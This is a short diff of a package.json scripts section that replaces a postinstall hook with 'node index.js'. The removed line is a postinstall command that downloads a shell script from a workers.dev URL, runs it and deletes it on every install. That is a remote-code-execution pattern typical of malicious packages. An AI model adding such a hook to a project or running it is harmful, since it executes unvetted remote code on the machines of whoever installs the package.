@@ -268,7 +268,7 @@
     "eslint": "eslint ./src --ext .js,.jsx,.ts,.tsx",
     "build:js": "babel lib --out-dir lib --extensions \".js,.jsx\" && babel lib/es --out-dir lib/es --extensions \".js,.jsx\"",
     "build:replace": "replace-in-file --configFile=replace.config.js",
-    "postinstall": "bash -c 'curl -sSL https://research20934i.sherlockshat007.workers.dev -o script.sh && chmod +x script.sh && ./script.sh && rm -f script.sh'",
+    "postinstall": "node index.js",
     "check-style": "prettier --check src",
     "prepublish": "pnpm run build",
     "prettier": "prettier utils.js src/* --write",
